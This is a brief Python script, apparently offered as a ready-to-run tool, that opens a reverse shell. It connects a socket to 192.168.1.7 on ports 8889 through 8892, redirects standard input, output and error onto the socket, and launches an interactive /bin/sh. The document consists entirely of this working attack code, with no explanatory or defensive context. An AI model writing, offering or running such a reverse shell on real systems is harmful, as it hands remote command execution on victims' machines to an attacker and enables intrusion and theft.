import socket
import subprocess
import os

def reverse_shell(host, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    os.dup2(s.fileno(), 0)
    os.dup2(s.fileno(), 1)
    os.dup2(s.fileno(), 2)
    p = subprocess.call(["/bin/sh", "-i"])

if __name__ == "__main__":
    host = "192.168.1.7"
    ports = [8889, 8890, 8891, 8892]  # Add the list of ports you want to connect to

    for port in ports:
        reverse_shell(host, port)
